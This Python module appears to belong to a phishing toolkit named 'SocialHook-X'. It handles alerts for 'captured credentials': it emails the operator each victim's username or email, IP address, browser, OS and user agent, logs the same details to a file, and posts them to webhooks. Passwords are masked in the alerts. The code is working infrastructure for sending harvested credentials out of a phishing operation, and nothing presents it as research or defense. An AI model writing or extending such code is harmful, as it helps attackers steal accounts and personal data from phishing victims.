"""
SocialHook-X Notification Module
Email and alert notifications
"""

import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from typing import List, Dict

logger = logging.getLogger(__name__)

class EmailNotifier:
    """Handle email notifications for captured credentials"""
    
    def __init__(self, smtp_server: str = "smtp.gmail.com", smtp_port: int = 587):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = None
        self.sender_password = None
    
    def configure(self, email: str, password: str, smtp_server: str = None, smtp_port: int = None):
        """Configure email credentials"""
        self.sender_email = email
        self.sender_password = password
        
        if smtp_server:
            self.smtp_server = smtp_server
        if smtp_port:
            self.smtp_port = smtp_port
        
        logger.info(f"Email notifier configured for {email}")
    
    def send_notification(self, recipient: str, subject: str, body: str, 
                         html: bool = False, attachments: List[str] = None) -> bool:
        """Send email notification"""
        
        if not self.sender_email or not self.sender_password:
            logger.error("Email notifier not configured")
            return False
        
        try:
            msg = MIMEMultipart('alternative')
            msg['From'] = self.sender_email
            msg['To'] = recipient
            msg['Subject'] = subject
            
            if html:
                msg.attach(MIMEText(body, 'html'))
            else:
                msg.attach(MIMEText(body, 'plain'))
            
            # Add attachments if provided
            if attachments:
                for attachment_path in attachments:
                    try:
                        with open(attachment_path, 'rb') as attachment:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(attachment.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', 
                                          f'attachment; filename= {attachment_path.split("/")[-1]}')
                            msg.attach(part)
                    except FileNotFoundError:
                        logger.warning(f"Attachment not found: {attachment_path}")
            
            # Send email
            server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=10)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.send_message(msg)
            server.quit()
            
            logger.info(f"Email notification sent to {recipient}")
            return True
        
        except smtplib.SMTPAuthenticationError:
            logger.error("SMTP authentication failed")
            return False
        except smtplib.SMTPException as e:
            logger.error(f"SMTP error: {e}")
            return False
        except Exception as e:
            logger.error(f"Error sending email: {e}")
            return False
    
    def send_credential_alert(self, credential: Dict, recipient: str) -> bool:
        """Send credential capture alert"""
        
        subject = f"[SocialHook-X] Credential Captured - {credential.get('template')}"
        
        # Redact sensitive information in the alert
        password = credential.get('password', '')
        password_masked = '*' * len(password) if password else 'N/A'
        
        body = f"""
Credential Captured!

Template: {credential.get('template')}
Timestamp: {credential.get('timestamp')}
IP Address: {credential.get('ip_address')}
Browser: {credential.get('browser')} on {credential.get('os')}

Username/Email: {credential.get('username') or credential.get('email')}
Password: [{password_masked}]

User Agent: {credential.get('user_agent')}

---
SocialHook-X v4.0
        """
        
        return self.send_notification(recipient, subject, body)


class AlertManager:
    """Manage multiple alert channels"""
    
    def __init__(self):
        self.email_notifier = EmailNotifier()
        self.webhooks: List[str] = []
        self.log_file = None
    
    def configure_email(self, email: str, password: str, smtp_server: str = None, smtp_port: int = None):
        """Configure email notifications"""
        self.email_notifier.configure(email, password, smtp_server, smtp_port)
    
    def add_webhook(self, url: str):
        """Add webhook URL for notifications"""
        self.webhooks.append(url)
        logger.info(f"Webhook added: {url}")
    
    def set_log_file(self, filepath: str):
        """Set log file for notifications"""
        self.log_file = filepath
        logger.info(f"Alert log file set: {filepath}")
    
    def notify_credential(self, credential: Dict, email_recipients: List[str] = None):
        """Send alerts through all configured channels"""
        
        # Log to file
        if self.log_file:
            try:
                with open(self.log_file, 'a') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write("[CREDENTIAL CAPTURED]\n")
                    f.write(f"Timestamp: {credential.get('timestamp')}\n")
                    f.write(f"Template: {credential.get('template')}\n")
                    f.write(f"IP: {credential.get('ip_address')}\n")
                    f.write(f"Username: {credential.get('username')}\n")
                    f.write(f"Browser: {credential.get('browser')} on {credential.get('os')}\n")
                    f.write(f"{'='*60}\n")
            except Exception as e:
                logger.error(f"Error writing to alert log: {e}")
        
        # Send emails
        if email_recipients:
            for recipient in email_recipients:
                self.email_notifier.send_credential_alert(credential, recipient)
        
        # Send to webhooks
        if self.webhooks:
            self._send_to_webhooks(self._sanitize_webhook_payload(credential))
    
    @staticmethod
    def _sanitize_webhook_payload(data):
        """Recursively redact sensitive fields before sending to webhooks."""
        sensitive_tokens = ("password", "pass", "secret", "token", "api_key", "apikey")
        
        if isinstance(data, dict):
            sanitized = {}
            for key, value in data.items():
                key_lower = str(key).lower()
                if any(token in key_lower for token in sensitive_tokens):
                    sanitized[key] = "***REDACTED***"
                else:
                    sanitized[key] = AlertManager._sanitize_webhook_payload(value)
            return sanitized
        
        if isinstance(data, list):
            return [AlertManager._sanitize_webhook_payload(item) for item in data]
        
        return data
    
    def _send_to_webhooks(self, data: Dict):
        """Send data to configured webhooks"""
        try:
            import requests
            
            for webhook_url in self.webhooks:
                try:
                    requests.post(webhook_url, json=data, timeout=5)
                    logger.info(f"Webhook notification sent: {webhook_url}")
                except Exception as e:
                    logger.error(f"Error sending webhook: {e}")
        
        except ImportError:
            logger.warning("requests library not available for webhooks")
